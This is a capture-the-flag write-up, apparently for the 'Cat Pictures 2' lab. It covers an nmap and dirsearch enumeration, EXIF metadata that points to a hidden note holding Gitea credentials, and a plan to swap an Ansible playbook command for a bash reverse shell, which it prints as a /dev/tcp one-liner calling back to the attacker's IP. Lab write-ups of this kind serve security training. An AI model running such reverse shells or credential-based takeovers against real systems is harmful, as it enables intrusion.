[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=35&pause=1000&color=6A0DAD&width=435&lines=Cat+Pictures+2)](https://git.io/typing-svg)

</br>

![Challenge Description](catpic2.png)

# Enumeration
##
### Let's begin with a rapid Nmap scan.
</br>

```bash
root@Fs:.../CTFs/catpictures2# nmap -sCV -oN nmap 10.10.44.70
# Nmap 7.80 scan initiated Mon Jul  3 19:58:08 2023 as: nmap -sCV -oN nmap 10.10.44.70
Nmap scan report for 10.10.44.70
Host is up (0.079s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-title: Lychee
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  3 19:58:29 2023 -- 1 IP address (1 host up) scanned in 21.17 seconds
```
##
    *80 — lychee*
    *8080 — python http server*
    *22,222 — ssh*
</br>

### Performing a scan using Dirsearch

```bash

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.187.79/-_23-07-06_21-12-01.txt

Error Log: /root/.dirsearch/logs/errors-23-07-06_21-12-01.log

Target: http://10.10.187.79/

[21:12:01] Starting: 
[21:12:03] 301 -  193B  - /robots.txt 
[21:12:04] 403 -  579B  - /.git/
[21:12:04] 403 -  579B  - /.github/
[21:12:04] 403 -  579B  - /.git/refs/
[21:12:04] 403 -  579B  - /.git/objects/
[21:12:04] 200 -  154B  - /.github/ISSUE_TEMPLATE.md
[21:12:04] 200 -  274B  - /.gitignore
[21:12:04] 200 -  630B  - /.htaccess
[21:12:07] 200 -  387B  - /.user.ini
[21:12:09] 200 -    1KB - /LICENSE
[21:12:10] 200 -    5KB - /README.md
```

I attempted to gather information by exploring the .git repository and robots.txt file, but unfortunately, I didn't find anything of interest.
</br>
After some time, I managed to discover interesting information from the EXIF data extracted from an image.

```
root@Fs:.../CTFs/catpictures2# exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
ExifTool Version Number         : 12.40
File Name                       : f5054e97620f168c7b5088c85ab1d6e4.jpg
Directory                       : .
File Size                       : 71 KiB
File Modification Date/Time     : 2022:11:07 19:44:37+01:00
File Access Date/Time           : 2023:07:06 21:20:55+01:00
File Inode Change Date/Time     : 2023:07:06 21:19:41+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : IX
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Image Width                     : 720
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 720x1080
Megapixels                      : 0.778
```
this part
```Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt```
##
It appears that the system is utilizing another web server to retrieve Info.

```red
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```
</br>
 samarium:TUmhyZ37CLZrhP
</br>

### Upon obtaining this information, we realized that there is a Gitea server running on port 3000, and we have obtained valid credentials for it.

![Screenshot from 2023-07-06 21-31-32](https://github.com/ACHUX21/Writeups/assets/130113878/d5da60f1-a1cd-4731-af5d-89b6eccc7f87)

# Gaining access
![image](https://github.com/ACHUX21/Writeups/assets/130113878/23cfac7c-5b54-494f-a91b-be69ffc138f1)
</br>

Given our knowledge of Ansible Runner (Olivetin) on port 1337, which enables the execution of Ansible playbooks, I intend to replace the existing "echo" command with a reverse shell.

```bash
bash -c "bash -i >& /dev/tcp/10.18.81.1/14632 0>&1"
```






 
 













